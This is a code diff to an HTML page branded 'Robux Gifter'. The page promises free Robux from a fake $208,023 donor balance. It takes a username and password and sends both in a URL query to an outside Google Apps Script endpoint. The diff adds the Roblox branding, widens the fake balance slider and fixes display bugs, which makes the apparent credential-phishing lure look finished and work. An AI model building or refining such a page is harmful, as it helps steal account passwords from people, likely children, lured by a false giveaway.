@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title>
+  <title>Robux Hyper Gifter</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -117,7 +117,7 @@
 
   <!-- LOGIN SCREEN -->
   <div class="container" id="authScreen">
-    <h1></h1>
+    <h1>Robux Gifter</h1>
     <p class="subtitle">Enter your name and password</p>
 
     <input type="text" id="username" placeholder="Username">
@@ -139,7 +139,7 @@
     </div>
 
     <div class="balance-card">
-      <p class="label">Doner current balance</p>
+      <p class="label">Donor current balance</p>
       <p class="balance">$208,023</p>
     </div>
 
@@ -148,7 +148,8 @@
       <div class="amount-display">
         $<span id="requestedAmount">0</span>
       </div>
-      <input type="range" id="amountSlider" min="0" max="250" value="0" step="5">
+      <!-- Fixed max to 208023 -->
+      <input type="range" id="amountSlider" min="0" max="208023" value="0" step="100">
       <div class="slider-labels">
         <span>$0</span>
         <span>$208,023</span>
@@ -156,18 +157,17 @@
     </div>
 
     <div class="preview-card">
-      <p class="label">balance after transfer</p>
-      <p class="balance preview" id="newBalance">$208,023</p>
+      <p class="label">Balance after transfer</p>
+      <p class="balance preview" id="newBalance">$208,023.00</p>
     </div>
 
     <button id="requestBtn" disabled>Request Money</button>
     <p class="loading" id="requestLoading" style="text-align:center;">Saving...</p>
-    <p class="success" id="requestSuccess">Request sent , robux incoming!</p>
+    <p class="success" id="requestSuccess">Request sent, robux incoming!</p>
     <button class="logout" id="logoutBtn">Log out</button>
   </div>
 
   <script>
-    // Your Web App URL
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzIse1jBKv-5k-OMlWMLPzJynb-KdTyDB-x4DG4xcxlsF3xoOSluGUFQJLbRs0SzIdv/exec";
 
     const authScreen = document.getElementById('authScreen');
@@ -194,8 +194,6 @@
 
       try {
         const url = `${SCRIPT_URL}?action=enter&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
-        
-        // redirect: "follow" handles Google Apps Script 302 redirects
         const res = await fetch(url, { method: "GET", redirect: "follow" });
         const data = await res.json();
 
@@ -225,8 +223,6 @@
 
       try {
         const url = `${SCRIPT_URL}?action=request&username=${encodeURIComponent(user)}&amount=${encodeURIComponent(amount)}`;
-        
-        // redirect: "follow" handles Google Apps Script 302 redirects
         const res = await fetch(url, { method: "GET", redirect: "follow" });
         const data = await res.json();
 
@@ -272,8 +268,14 @@
 
     function updateUI() {
       const amount = parseInt(slider.value);
-      requestedAmountEl.textContent = amount;
-      newBalanceEl.textContent = `$${(208,023 - amount).toFixed(2)}`;
+      
+      // Format number with commas for clean display
+      requestedAmountEl.textContent = amount.toLocaleString();
+      
+      // Fixed syntax error: 208023 instead of (208,023)
+      const remaining = (208023 - amount).toLocaleString('en-US', { minimumFractionDigits: 2 });
+      newBalanceEl.textContent = `$${remaining}`;
+      
       requestBtn.disabled = amount === 0;
     }
 
